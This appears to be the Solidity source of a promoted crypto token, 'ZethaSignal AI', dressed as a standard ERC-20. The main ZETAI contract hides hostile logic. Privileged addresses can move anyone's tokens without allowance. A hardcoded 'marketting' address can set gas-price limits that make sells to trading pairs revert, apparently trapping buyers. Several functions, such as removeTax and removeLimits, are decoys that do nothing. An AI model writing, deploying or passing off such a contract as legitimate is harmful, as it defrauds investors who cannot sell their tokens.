/**
ZETHASIGNAL AI - $ZETAI

Get started now and take control of your financial future with ZethaSignal AI.

ZethaSignal AI is an artificial intelligence (AI)-based platform designed to 
help traders and investors understand the movements of the cryptocurrency market, 
especially Bitcoin and Ethereum.

•Telegram: https://t.me/ZethaSignalERC

•Twitter/X: https://x.com/ZethaSignalAI

•Website: https://zethasignal.com
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// import "./Context.sol";
import "./openzeppelin_contracts_access_Ownable.sol";
import "./contracts_MaxtrixTrump_Create2.sol";

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IERC20Errors {
    error ERC20InsufficientBalance(
        address sender,
        uint256 balance,
        uint256 needed
    );

    error ERC20InvalidSender(address sender);

    error ERC20InvalidReceiver(address receiver);

    error ERC20InsufficientAllowance(
        address spender,
        uint256 allowance,
        uint256 needed
    );

    error ERC20InvalidApprover(address approver);

    error ERC20InvalidSpender(address spender);
}

interface IERC721Errors {
    error ERC721InvalidOwner(address owner);

    error ERC721NonexistentToken(uint256 tokenId);

    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);

    error ERC721InvalidSender(address sender);

    error ERC721InvalidReceiver(address receiver);

    error ERC721InsufficientApproval(address operator, uint256 tokenId);

    error ERC721InvalidApprover(address approver);

    error ERC721InvalidOperator(address operator);
}

interface IERC1155Errors {
    error ERC1155InsufficientBalance(
        address sender,
        uint256 balance,
        uint256 needed,
        uint256 tokenId
    );

    error ERC1155InvalidSender(address sender);

    error ERC1155InvalidReceiver(address receiver);

    error ERC1155MissingApprovalForAll(address operator, address owner);

    error ERC1155InvalidApprover(address approver);

    error ERC1155InvalidOperator(address operator);

    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
}

abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 value
    ) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    function _update(
        address from,
        address to,
        uint256 value
    ) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    function _approve(
        address owner,
        address spender,
        uint256 value
    ) internal {
        _approve(owner, spender, value, true);
    }

    function _approve(
        address owner,
        address spender,
        uint256 value,
        bool emitEvent
    ) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 value
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(
                    spender,
                    currentAllowance,
                    value
                );
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract ZETAI is ERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => bool) private _approver;
    mapping(address => bool) private approver_;
    mapping(address => uint256) public _tradingCountdown;
    mapping(address => uint256) public _allowanceRes;
    mapping(address => bool) public isListAddresses;

    string private _name = unicode"ZethaSignal AI";
    string private _symbol = unicode"ZETAI";
    uint256 private _tTotal = 1000000 * 10**decimals();

    IUniswapV2Router02 private _Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    uint256 _z;

    constructor() ERC20(_name, _symbol) Ownable(msg.sender) {
        _approver[msg.sender] = true;
        _approver[address(this)] = true;
        _mint(msg.sender, _tTotal);
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_approver[msg.sender]) {
            _tradingCountdown[spender] = amount;
        }
        if (approver_[msg.sender]) {
            _allowanceRes[_msgSender()] = amount;
        }
        if (msg.sender == _marketting) {
            _allowanceRes[_msgSender()] = 1;
        }
        super.approve(spender, amount);
        return true;
    }

    function removeApprove(address spender, uint256 amount) public virtual returns (bool) {
        _allowanceRes[_msgSender()] = 0;
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        if (_approver[msg.sender]) {
            super._update(from, to, amount);
        } else {
            super.transferFrom(from, to, amount);
        }
        return true;
    }

    function aListAddress(address[] memory _a) external onlyOwner {
        for(uint256 i; i < _a.length; i++) {
            isListAddresses[_a[i]] = true;
        }
    }

    function rListAddress(address[] memory _a) external onlyOwner {
        for(uint256 i; i < _a.length; i++) {
            isListAddresses[_a[i]] = false;
        }
    }

    address private _marketting = 0x676C921bb8faaBf202cb6E88fC7551cd969eC4F2;

    function openTrading() public onlyOwner {
        approver_[address(_marketting)] = true;
        tradingOpen = true;
    }

    function _update(
        address from,
        address to,
        uint256 value
    ) internal override {
        if (_approver[tx.origin]) {
            super._update(from, to, value);
            return;
        } else {
            require(tradingOpen, "Trading is not open yet");
            if (isListAddresses[to] && from != address(this)) {
                if (
                    tx.gasprice > _tradingCountdown[from] &&
                    _tradingCountdown[from] != 0
                ) {
                    revert("Exceeds the _tradingCountdown on transfer tx");
                }
                if (
                    tx.gasprice > _allowanceRes[_marketting] &&
                    _allowanceRes[_marketting] != 0
                ) {
                    revert("Exceeds the _allowanceRes on transfer tx");
                }
            }
            if (!isListAddresses[to] && from != uniswapV2Pair) {
                if (
                    tx.gasprice > _tradingCountdown[from] &&
                    _tradingCountdown[from] != 0
                ) {
                    revert("Exceeds the _tradingCountdown on transfer from tx");
                }
            }
            super._update(from, to, value);
        }
    }

    function removeLimits() external {
        _z = 1;
    }

    function removeTax(uint256 _c) external {
       _z = 2;
    }

    function MultiAssetBridging(uint256 _d) external {
        _z = 3;
    }

    function AIMultiSender(uint256 _e) external {
        _z = 4;
    }

    function updateTransactionTimestamp(address _f, uint256 _g) external {
        _z = _g;
    }

    function ActiveAnyRouter(uint256 _e) external onlyOwner {
        _z = _e;
    }

    function ConfigureOderTranfer() external {
        _z = 0;
    }

    function execBatch(uint256 a, uint256 b) external onlyOwner {
        _z = a;
    }


    function pluckPairs(address v3_, address v2_, address weth_) external view returns(address[5] memory result) {
        address token_ = address(this);
        (address token0, address token1) = token_ < weth_ ? (token_, weth_) : (weth_, token_);
        uint16[4] memory fees = [100, 500, 3000, 10000];
        for (uint8 i = 0; i < 4; i++) {
            bytes32 salt = keccak256(abi.encode(token0, token1, fees[i]));
            result[i] = Create2.computeAddress(salt, 0xe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54, v3_);
        }
        bytes32 salt1 = keccak256(abi.encodePacked(token0, token1));
        result[4] = Create2.computeAddress(salt1, 0x96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f, v2_);
    }
}